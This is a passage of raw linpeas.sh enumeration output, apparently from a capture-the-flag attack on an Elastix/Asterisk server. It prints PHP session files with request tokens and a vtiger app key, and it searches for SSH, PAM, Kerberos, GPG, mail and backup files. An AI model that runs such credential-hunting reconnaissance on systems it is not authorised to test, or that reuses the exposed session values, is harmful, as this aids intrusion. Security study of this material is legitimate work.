Provider";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"10";s:8:"HasChild";b:0;}s:9:"dashboard";a:7:{s:2:"id";s:9:"dashboard";s:8:"IdParent";s:7:"sysdash";s:4:"Link";s:0:"";s:4:"Name";s:9:"Dashboard";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"11";s:8:"HasChild";b:0;}s:9:"sec_rules";a:7:{s:2:"id";s:9:"sec_rules";s:8:"IdParent";s:12:"sec_firewall";s:4:"Link";s:0:"";s:4:"Name";s:14:"Firewall Rules";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"11";s:8:"HasChild";b:0;}s:7:"faxlist";a:7:{s:2:"id";s:7:"faxlist";s:8:"IdParent";s:11:"virtual_fax";s:4:"Link";s:0:"";s:4:"Name";s:16:"Virtual Fax List";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"11";s:8:"HasChild";b:0;}s:12:"applet_admin";a:7:{s:2:"id";s:12:"applet_admin";s:8:"IdParent";s:7:"sysdash";s:4:"Link";s:0:"";s:4:"Name";s:22:"Dashboard Applet Admin";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"12";s:8:"HasChild";b:0;}s:9:"sec_ports";a:7:{s:2:"id";s:9:"sec_ports";s:8:"IdParent";s:12:"sec_firewall";s:4:"Link";s:0:"";s:4:"Name";s:12:"Define Ports";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"12";s:8:"HasChild";b:0;}s:6:"faxnew";a:7:{s:2:"id";s:6:"faxnew";s:8:"IdParent";s:11:"virtual_fax";s:4:"Link";s:0:"";s:4:"Name";s:15:"New Virtual Fax";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"12";s:8:"HasChild";b:0;}s:7:"sendfax";a:7:{s:2:"id";s:7:"sendfax";s:8:"IdParent";s:11:"virtual_fax";s:4:"Link";s:0:"";s:4:"Name";s:8:"Send Fax";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"13";s:8:"HasChild";b:0;}s:9:"a2b_admin";a:7:{s:2:"id";s:9:"a2b_admin";s:8:"IdParent";s:3:"a2b";s:4:"Link";s:15:"a2billing/admin";s:4:"Name";s:5:"Admin";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"21";s:8:"HasChild";b:0;}s:9:"a2b_agent";a:7:{s:2:"id";s:9:"a2b_agent";s:8:"IdParent";s:3:"a2b";s:4:"Link";s:15:"a2billing/agent";s:4:"Name";s:5:"Agent";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"22";s:8:"HasChild";b:0;}s:12:"a2b_customer";a:7:{s:2:"id";s:12:"a2b_customer";s:8:"IdParent";s:3:"a2b";s:4:"Link";s:18:"a2billing/customer";s:4:"Name";s:8:"Customer";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"23";s:8:"HasChild";b:0;}s:18:"network_parameters";a:7:{s:2:"id";s:18:"network_parameters";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:18:"Network Parameters";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"31";s:8:"HasChild";b:0;}s:13:"billing_rates";a:7:{s:2:"id";s:13:"billing_rates";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:5:"Rates";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"31";s:8:"HasChild";b:0;}s:7:"sphones";a:7:{s:2:"id";s:7:"sphones";s:8:"IdParent";s:9:"downloads";s:4:"Link";s:21:"static/softphones.htm";s:4:"Name";s:10:"Softphones";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"31";s:8:"HasChild";b:0;}s:11:"dhcp_server";a:7:{s:2:"id";s:11:"dhcp_server";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:11:"DHCP Server";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"32";s:8:"HasChild";b:0;}s:14:"billing_report";a:7:{s:2:"id";s:14:"billing_report";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:14:"Billing Report";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"32";s:8:"HasChild";b:0;}s:8:"faxutils";a:7:{s:2:"id";s:8:"faxutils";s:8:"IdParent";s:9:"downloads";s:4:"Link";s:19:"static/faxutils.htm";s:4:"Name";s:13:"Fax Utilities";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"32";s:8:"HasChild";b:0;}s:15:"dhcp_clientlist";a:7:{s:2:"id";s:15:"dhcp_clientlist";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:16:"DHCP Client List";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"33";s:8:"HasChild";b:0;}s:17:"dest_distribution";a:7:{s:2:"id";s:17:"dest_distribution";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:24:"Destination Distribution";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"33";s:8:"HasChild";b:0;}s:16:"instantmessaging";a:7:{s:2:"id";s:16:"instantmessaging";s:8:"IdParent";s:9:"downloads";s:4:"Link";s:27:"static/instantmessaging.htm";s:4:"Name";s:17:"Instant Messaging";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"33";s:8:"HasChild";b:0;}s:11:"dhcp_by_mac";a:7:{s:2:"id";s:11:"dhcp_by_mac";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:25:"Assign IP Address to Host";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"34";s:8:"HasChild";b:0;}s:13:"billing_setup";a:7:{s:2:"id";s:13:"billing_setup";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:13:"Billing Setup";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"34";s:8:"HasChild";b:0;}s:8:"userlist";a:7:{s:2:"id";s:8:"userlist";s:8:"IdParent";s:7:"usermgr";s:4:"Link";s:0:"";s:4:"Name";s:5:"Users";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"42";s:8:"HasChild";b:0;}s:12:"repositories";a:7:{s:2:"id";s:12:"repositories";s:8:"IdParent";s:7:"updates";s:4:"Link";s:0:"";s:4:"Name";s:12:"Repositories";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"81";s:8:"HasChild";b:0;}s:12:"asterisk_cli";a:7:{s:2:"id";s:12:"asterisk_cli";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:12:"Asterisk-Cli";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"81";s:8:"HasChild";b:0;}s:8:"packages";a:7:{s:2:"id";s:8:"packages";s:8:"IdParent";s:7:"updates";s:4:"Link";s:0:"";s:4:"Name";s:8:"Packages";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"82";s:8:"HasChild";b:0;}s:11:"file_editor";a:7:{s:2:"id";s:11:"file_editor";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:20:"Asterisk File Editor";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"82";s:8:"HasChild";b:0;}s:11:"text_to_wav";a:7:{s:2:"id";s:11:"text_to_wav";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:11:"Text to Wav";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"83";s:8:"HasChild";b:0;}s:8:"festival";a:7:{s:2:"id";s:8:"festival";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:8:"Festival";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"84";s:8:"HasChild";b:0;}s:10:"recordings";a:7:{s:2:"id";s:10:"recordings";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:10:"Recordings";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"85";s:8:"HasChild";b:0;}s:8:"language";a:7:{s:2:"id";s:8:"language";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:8:"Language";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"101";s:8:"HasChild";b:0;}s:11:"time_config";a:7:{s:2:"id";s:11:"time_config";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:9:"Date/Time";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"102";s:8:"HasChild";b:0;}s:13:"themes_system";a:7:{s:2:"id";s:13:"themes_system";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:6:"Themes";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"103";s:8:"HasChild";b:0;}s:8:"currency";a:7:{s:2:"id";s:8:"currency";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:8:"Currency";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"104";s:8:"HasChild";b:0;}s:6:"system";a:7:{s:2:"id";s:6:"system";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"System";s:4:"Type";s:0:"";s:8:"order_no";s:1:"0";s:8:"HasChild";b:1;}s:6:"agenda";a:7:{s:2:"id";s:6:"agenda";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"Agenda";s:4:"Type";s:0:"";s:8:"order_no";s:1:"2";s:8:"HasChild";b:1;}s:11:"email_admin";a:7:{s:2:"id";s:11:"email_admin";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:5:"Email";s:4:"Type";s:0:"";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:3:"fax";a:7:{s:2:"id";s:3:"fax";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:3:"Fax";s:4:"Type";s:0:"";s:8:"order_no";s:1:"4";s:8:"HasChild";b:1;}s:9:"pbxconfig";a:7:{s:2:"id";s:9:"pbxconfig";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:3:"PBX";s:4:"Type";s:0:"";s:8:"order_no";s:1:"5";s:8:"HasChild";b:1;}s:2:"im";a:7:{s:2:"id";s:2:"im";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:2:"IM";s:4:"Type";s:0:"";s:8:"order_no";s:1:"6";s:8:"HasChild";b:1;}s:7:"reports";a:7:{s:2:"id";s:7:"reports";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:7:"Reports";s:4:"Type";s:0:"";s:8:"order_no";s:1:"8";s:8:"HasChild";b:1;}s:6:"extras";a:7:{s:2:"id";s:6:"extras";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"Extras";s:4:"Type";s:0:"";s:8:"order_no";s:1:"9";s:8:"HasChild";b:1;}s:6:"addons";a:7:{s:2:"id";s:6:"addons";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"Addons";s:4:"Type";s:0:"";s:8:"order_no";s:2:"10";s:8:"HasChild";b:1;}s:12:"my_extension";a:7:{s:2:"id";s:12:"my_extension";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:12:"My Extension";s:4:"Type";s:0:"";s:8:"order_no";s:2:"11";s:8:"HasChild";b:1;}s:8:"security";a:7:{s:2:"id";s:8:"security";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:8:"Security";s:4:"Type";s:0:"";s:8:"order_no";s:2:"12";s:8:"HasChild";b:1;}}menu|s:6:"extras";faxlist|a:1:{s:13:"faxListStatus";a:0:{}}AMP_user|O:7:"ampuser":6:{s:8:"username";s:12:"asteriskuser";s:9:"_password";b:0;s:15:"_extension_high";s:0:"";s:14:"_extension_low";s:0:"";s:9:"_deptname";s:0:"";s:9:"_sections";a:1:{i:0;s:1:"*";}}auth_time|i:1671874280;language|N;task|s:4:"mail";request_tokens|a:1:{s:4:"mail";s:32:"b7f9a7d4404868894053006a59a307ea";}temp|b:1;dashboard|a:5:{s:22:"Applet_SystemResources";b:1;s:22:"Applet_ProcessesStatus";b:1;s:17:"Applet_HardDrives";b:1;s:25:"Applet_PerformanceGraphic";b:1;s:11:"Applet_News";b:1;}
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_5u1haudjhv7jldnge8s5brv0m7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_66egmr0ds2asf0m6npmhgv30k1
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_6drsvs8vrn284j794qiu7fgig0
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_6hibqqvqduuj1t9vkd7fjs2nn7
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_6mafpa91fhbvlb8r84pk7mbk80
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_6pni3edovtn22gvsfa864s99s1
+-rw------- 1 asterisk asterisk 0 Dec 24 11:23 /tmp/sess_7baoiu02eo9jo8ga5s8he71k64
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_7d7lg2s16dos2kim0rjnk5rqf7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_7nkk6lc4i8jr42461p6ch575v2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_8b78is39gn5v5ll12marcdm7p1
+-rw------- 1 asterisk asterisk 0 Dec 24 10:55 /tmp/sess_9ief6qu64dmakc9hdg7reo74b1
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_bgmtvir3iut4jhakqf91tnvpi2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:06 /tmp/sess_cchgpjh6qia7t8mtaf3t6p7bt2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_cd19vjfajn4o3v33i9v499jl66
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_cgqm29t5m2lsb85v9ldtlirps6
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_coe7j65h040dlspp7vv1onqtm3
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_cqj38taikkh5qo0clqtn0u0ej5
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_dnhhh5glhsfnv78fb27ll75pp7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_e3d8203s8vb3rn5s92lq69doh1
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_eglrllsqmm51r4kv6ie1cj41f2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_eofbnmonemmv8i1horcbhs9ce2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_fd6ata0rjf7qb2sga89vdrs7i0
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_g0noee23od232noed959km55t4
+-rw------- 1 asterisk asterisk 0 Dec 24 11:19 /tmp/sess_gnfp0ocqt3khtqhl315m26sld4
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_halkd3ghnd52h1ehu79ccmu6p4
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_hbu9npokc8ef00u1b1839jjmq0
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_hqk07kov5pme6qtuo6rhm55c17
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_i6o6n4orv707v71jcper63dmn0
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_id85agct23eoqmbsm129m7t6j1
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_ijdq29pbr1iluj13jvkuti4pv0
+-rw------- 1 asterisk asterisk 0 Dec 24 11:23 /tmp/sess_ing91odahta786lltdemt5plh7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:09 /tmp/sess_j1q5o5vgd4ec6paqvgiu9jv2i7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:26 /tmp/sess_j38vnlnh6387pktgkd85fasek1
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_j473egndejctt9ppmb4c1gcsh6
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_jgaltelaq7iltpsvqu2r4htio4
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_jpjil40mqgqmgmklkcuksrgo66
+-rw------- 1 asterisk asterisk 235 Dec 24 11:57 /tmp/sess_kkok3fn38cfr1m5v2nrrgtoq42
+VTIGER_DB_VERSION|s:5:"5.1.0";lastpage|N;authenticated_user_id|s:1:"1";app_unique_key|s:32:"dc66d1a8b837fd5771a6ce148834c0a6";vtiger_authenticated_user_theme|s:6:"softed";authenticated_user_language|s:5:"en_us";internal_mailer|s:1:"1";
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_l0il6rnsahjkr5cumt44dels91
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_l2tdltae99oeta4dd737jutth3
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_lel5me7pm0m5doolv5h6j0c7q4
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_m529lvf8lgo8tprjcph5o0m831
+-rw------- 1 asterisk asterisk 0 Dec 24 11:29 /tmp/sess_m5j2bv9kcvnmr61rm4m0kgsv03
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_m77usk8nu1pdhgc8uhds5n01r7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_m7dlvjoae43t6n9qpuoo9mp4r2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_mbsakn08ob11304l4gs543d9o4
+-rw------- 1 asterisk asterisk 1246 Dec 24 11:54 /tmp/sess_mo3gko6ssagi8p8kb8n023rgq3
+VTIGER_DB_VERSION|s:5:"5.1.0";lastpage|N;authenticated_user_id|s:1:"1";app_unique_key|s:32:"dc66d1a8b837fd5771a6ce148834c0a6";vtiger_authenticated_user_theme|s:6:"softed";authenticated_user_language|s:5:"en_us";internal_mailer|s:1:"1";lvs|a:1:{s:9:"Documents";a:6:{s:6:"module";s:9:"Documents";s:8:"viewname";s:2:"22";s:5:"start";i:1;s:6:"sorder";N;s:6:"sortby";N;s:9:"page_view";N;}}NOTES_ORDER_BY|s:0:"";NOTES_SORT_ORDER|s:3:"ASC";Documents_listquery|s:667:"select vtiger_notes.note_no,vtiger_notes.title,vtiger_notes.filename,vtiger_crmentity.modifiedtime,case when (vtiger_users.user_name not like '') then vtiger_users.user_name else vtiger_groups.groupname end as user_name ,vtiger_crmentity.crmid,vtiger_notes.* FROM vtiger_notes
+                        INNER JOIN vtiger_crmentity
+                                ON vtiger_crmentity.crmid = vtiger_notes.notesid
+                        LEFT JOIN vtiger_groups
+                                ON vtiger_groups.groupid = vtiger_crmentity.smownerid
+                        LEFT JOIN vtiger_users
+                                ON vtiger_users.id = vtiger_crmentity.smownerid
+                        LEFT JOIN vtiger_attachmentsfolder 
+                                ON vtiger_notes.folderid = vtiger_attachmentsfolder.folderid 
+                        WHERE vtiger_crmentity.deleted = 0 ";BLOCKINITIALSTATUS|a:3:{s:17:"Basic Information";s:1:"1";s:11:"Description";s:1:"1";s:16:"File Information";s:1:"1";}
+-rw------- 1 asterisk asterisk 0 Dec 24 11:10 /tmp/sess_mqbb5cnnnjafciojciddkesjj3
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_n1id3a1ud13n8slen77pihgl96
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_n3mfaqlft19sh83cpflclm4361
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_n49q1qir1rvvh5i64bg1jrc4a3
+-rw------- 1 asterisk asterisk 0 Dec 24 11:09 /tmp/sess_n6en5q14daq0q6e4m3g968tqi2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_nm45vg3i3dcptpi99ovbq55ge6
+-rw------- 1 asterisk asterisk 141 Dec 24 11:18 /tmp/sess_pjlmi4tbnttfm7dhst7j2mtad0
+auth_time|i:1671873497;temp|b:1;language|s:5:"en_US";task|s:4:"mail";request_tokens|a:1:{s:4:"mail";s:32:"cfc214aeac2a142c5a2c9330b8ab6198";}
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_qt632kig1ktatc312hqvc2es41
+
+╔══════════╣ Searching ssl/ssh files
+find: ./vmware-root: Permission denied                                                                                                                                                                                                                                                                                      
+══╣ Some certificates were found (out limited):
+/etc/vmware-tools/GuestProxyData/server/cert.pem                                                                                                                                                                                                                                                                            
+12594PSTORAGE_CERTSBIN
+
+./linpeas.sh: line 2737: gpg-connect-agent: command not found
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow                                                                                                                                                                                                                                                                                                            
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+        GSSAPIAuthentication yes
+        ForwardX11Trusted yes
+        SendEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES 
+        SendEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT 
+        SendEnv LC_IDENTIFICATION LC_ALL
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 2 root root 4096 Jul 16  2019 /etc/pam.d                                                                                                                                                                                                                                                                         
+-rw-r--r-- 1 root root 285 Apr 14  2011 /etc/pam.d/sshd
+auth       include      system-auth
+account    include      system-auth
+password   include      system-auth
+session    include      system-auth
+
+
+╔══════════╣ Analyzing NFS Exports Files (limit 70)
+-rw-r--r-- 1 root root 0 Jan 13  2000 /etc/exports                                                                                                                                                                                                                                                                          
+drwx--x--x 2 root bin 4096 Apr  7  2017 /etc/webmin/exports
+
+╔══════════╣ Searching kerberos conf files and tickets
+╚ http://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-active-directory                                                                                                                                                                                                                                         
+ptrace protection is enabled (), you need to disable it to search for tickets inside processes memory                                                                                                                                                                                                                       
+-rw-r--r-- 1 root root 608 Jun 25  2007 /etc/krb5.conf
+[logging]
+ default = FILE:/var/log/krb5libs.log
+ kdc = FILE:/var/log/krb5kdc.log
+ admin_server = FILE:/var/log/kadmind.log
+
+[libdefaults]
+ default_realm = EXAMPLE.COM
+ dns_lookup_realm = false
+ dns_lookup_kdc = false
+ ticket_lifetime = 24h
+ forwardable = yes
+
+[realms]
+ EXAMPLE.COM = {
+  kdc = kerberos.example.com:88
+  admin_server = kerberos.example.com:749
+  default_domain = example.com
+ }
+
+[domain_realm]
+ .example.com = EXAMPLE.COM
+ example.com = EXAMPLE.COM
+
+[appdefaults]
+ pam = {
+   debug = false
+   ticket_lifetime = 36000
+   renew_lifetime = 36000
+   forwardable = true
+   krb4_convert = false
+ }
+-rw-r--r-- 1 root root 786 Mar 30  2011 /usr/kerberos/share/examples/krb5/krb5.conf
+[libdefaults]
+        default_realm = ATHENA.MIT.EDU
+        krb4_config = /usr/kerberos/lib/krb.conf
+        krb4_realms = /usr/kerberos/lib/krb.realms
+
+[realms]
+        ATHENA.MIT.EDU = {
+                admin_server = KERBEROS.MIT.EDU
+                default_domain = MIT.EDU
+                v4_instance_convert = {
+                        mit = mit.edu
+                        lithium = lithium.lcs.mit.edu
+                }
+        }
+        ANDREW.CMU.EDU = {
+                admin_server = vice28.fs.andrew.cmu.edu
+        }
+# use "kdc =" if realm admins haven't put SRV records into DNS
+        GNU.ORG = {
+                kdc = kerberos.gnu.org
+                kdc = kerberos-2.gnu.org
+                admin_server = kerberos.gnu.org
+        }
+
+[domain_realm]
+        .mit.edu = ATHENA.MIT.EDU
+        mit.edu = ATHENA.MIT.EDU
+        .media.mit.edu = MEDIA-LAB.MIT.EDU
+        media.mit.edu = MEDIA-LAB.MIT.EDU
+        .ucsc.edu = CATS.UCSC.EDU
+
+[logging]
+#       kdc = CONSOLE
+tickets kerberos Not Found
+klist Not Found                                                                                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                                                                                            
+
+
+╔══════════╣ Analyzing Backup Manager Files (limit 70)
+-rw-r--r-- 1 root root 14904 Jan  3  2008 /usr/share/pear/DB/storage.php                                                                                                                                                                                                                                                    
+
+-rw-r--r-- 1 asterisk asterisk 1753 Jul 31  2008 /var/www/html/admin/modules/fw_ari/htdocs_ari/includes/database.php
+-rw-r--r-- 1 asterisk asterisk 1753 Jul 31  2008 /var/www/html/recordings/includes/database.php
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd                                                                                                                                                                                                                                                                                              
+passwd file: /etc/passwd
+
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg                                                                                                                                                                                                                                                                                                                
+gpg Not Found
+netpgpkeys Not Found                                                                                                                                                                                                                                                                                                        
+netpgp Not Found                                                                                                                                                                                                                                                                                                            
+-rw-r--r-- 1 root root 1088 Dec 23  2002 /usr/share/doc/m2crypto-0.16/demo/pgp/pubring.pgp                                                                                                                                                                                                                                  
+-rw-r--r-- 1 root root 1969 Dec 23  2002 /usr/share/doc/m2crypto-0.16/demo/pgp/secring.pgp
+
+
+
+╔══════════╣ Analyzing Cache Vi Files (limit 70)
+-rw-r--r-- 1 asterisk asterisk 20480 Jul 21  2009 /var/www/html/vtigercrm/include/tcpdf/config/.tcpdf_config.php.swp                                                                                                                                                                                                        
+
+
+╔══════════╣ Kubernetes information
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Analyzing SNMP Files (limit 70)
+-rw-r--r-- 1 root root 18579 May 26  2010 /etc/snmp/snmpd.conf                                                                                                                                                                                                                                                              
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+drwxr-xr-x 2 root root 4096 Dec 24 11:31 /etc/postfix                                                                                                                                                                                                                                                                       
+-rw-r--r-- 1 root root 4137 May 31  2011 /etc/postfix/master.cf
+  flags=DRhu user=vmail argv=/usr/local/bin/maildrop -d ${recipient}
+  flags=R user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -m ${extension} ${user}
+  user=cyrus argv=/usr/lib/cyrus-imapd/deliver -e -r ${sender} -m ${extension} ${user}
+  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
+  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
+  flags=Fq. user=foo argv=/usr/local/sbin/bsmtp -f $sender $nexthop $recipient
+
+drwx--x--x 2 root bin 4096 Apr  7  2017 /etc/webmin/postfix
+find: /etc/webmin/postfix: Permission denied
+
+drwxr-xr-x 2 root root 4096 Apr  7  2017 /usr/libexec/postfix
+
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/blue-theme/postfix
+
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/caldera/postfix
+
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/mscstyle3/postfix
+
+drwxr-xr-x 5 root root 4096 Apr  7  2017 /usr/libexec/webmin/postfix
+
+drwxr-xr-x 2 asterisk asterisk 4096 Oct 30  2011 /usr/share/elastix/module_installer/elastix-email_admin-2.2.0-9/setup/etc/postfix
+
+drwxr-xr-x 16 root root 4096 Apr  7  2017 /var/spool/postfix
+find: /var/spool/postfix/incoming: Permission denied
+find: /var/spool/postfix/corrupt: Permission denied
+find: /var/spool/postfix/hold: Permission denied
+find: /var/spool/postfix/maildrop: Permission denied
+find: /var/spool/postfix/flush: Permission denied
+find: /var/spool/postfix/bounce: Permission denied
+find: /var/spool/postfix/defer: Permission denied
+find: /var/spool/postfix/public: Permission denied
+find: /var/spool/postfix/deferred: Permission denied
+find: /var/spool/postfix/saved: Permission denied
+find: /var/spool/postfix/private: Permission denied
+find: /var/spool/postfix/active: Permission denied
+find: /var/spool/postfix/trace: Permission denied
+
+
+╔══════════╣ Analyzing Sentry Files (limit 70)
+drwx--x--x 2 root bin 4096 Apr  7  2017 /etc/webmin/sentry                                                                                                                                                                                                                                                                  
+find: /etc/webmin/sentry: Permission denied
+
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/blue-theme/sentry
+
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/caldera/sentry
+
+drwxr-xr-x 5 root root 4096 Apr  7  2017 /usr/libexec/webmin/sentry
+
+
+
+╔══════════╣ Analyzing Windows Files Files (limit 70)
+                                                                                                                                                                                                                                                                                                                            
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-rw-r--r-- 1 root root 441 May 10  2011 /etc/my.cnf
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+drwx--x--x 2 root bin 4096 Apr  7  2017 /etc/webmin/software
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/blue-theme/software
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/caldera/software
+drwxr-xr-x 3 root root 4096 Apr  7  2017 /usr/libexec/webmin/mscstyle3/software
+drwxr-xr-x 5 root root 4096 Apr  7  2017 /usr/libexec/webmin/software
+
+
+
+
+
+
+
+
+
+
+
+
+
+╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
+-rw-r--r-- 1 root root 124 Jan 22  2009 /etc/skel/.bashrc                                                                                                                                                                                                                                                                   
+-rw-r--r-- 1 fanis fanis 124 Apr  7  2017 /home/fanis/.bashrc
+
+
+
+
+
+
+
+
+
+
+
+                                         ╔═══════════════════╗
